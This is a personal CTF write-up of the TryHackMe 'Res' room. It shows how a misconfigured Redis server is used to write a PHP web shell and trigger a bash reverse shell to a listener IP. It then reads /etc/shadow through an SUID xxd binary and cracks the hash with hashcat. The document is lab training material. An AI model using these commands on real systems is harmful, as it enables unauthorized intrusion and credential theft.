### Intro

Today I pwnd a RES room (https://tryhackme.com/room/res) from **TryHackMe**!
This one featured a misconfigured Redis service that opened the door to initial access, and a bit of fun with SUID binaries for privilege escalation. Definitely a good mix of enumeration and exploitation!

### Enumeration

- Starting with **nmap**:

```bash
$ nmap -sC -sV -vv -p- 10.10.100.10 -oA nmap_res.txt

- And we got 2 ports opened, one of which - Redis

### Exploitation/Post exploitation

- After some googling I found that this Redis version is vulnerable for file uploading/RCE, so let's use it:

```bash
$ redis-cli -h 10.10.100.10
10.10.100.10:6379> SET x "<?php system($_GET['cmd']); ?>"
OK
10.10.100.10:6379> config set dbfilename shell.php
OK
10.10.100.10:6379> config set dir /var/www/html
OK
10.10.100.10:6379> save
OK
```

- Starting listener:

```bash
nc -lvnp 1337
```

- Start the shell in the browser (don't forget to URL encode it before) `https://10.10.100.10/shell.php?cmd=%2fbin%2fbash%20-c%20%27bash%20-i%20%3E%26%20%2fdev%2ftcp%2f10.11.12.13%2f1337%200%3E%261%27`

- And we get a shell!
- Upgrade/stabilize shell (`https://2br007.github.io/posts/mrrobot/#shell-stabilization`)
- User flag was easy to find and read, so there will be no problem but next one was more interesting since we need to get a user password ...
- As always I downloaded `Linpeas.sh` to `/tmp`
- I checked for files I could run with sudo `sudo -l`
- Looked for SUID files `find / -type f -perm -4000 2>/dev/null`
- There was interesting one: `XXD` (more info here -> *https://gtfobins.github.io/gtfobins/xxd/#file-read*)
- So let's check a `/etc/shadow`:

```bash
www-data@ubuntu:/tmp$ LFILE=/etc/shadow
www-data@ubuntu:/tmp$ xxd "$LFILE" | xxd -r
```

- We got a password hash! Let's crack it:

```bash
$ echo '$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CW...Xwvri0' > hash
$ hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt

hashcat (v6.2.6) starting

- Yeap, rockyou will be enough to crack it
- Root flag will be easy to get since we could abuse XXD ...
- That's all folks!
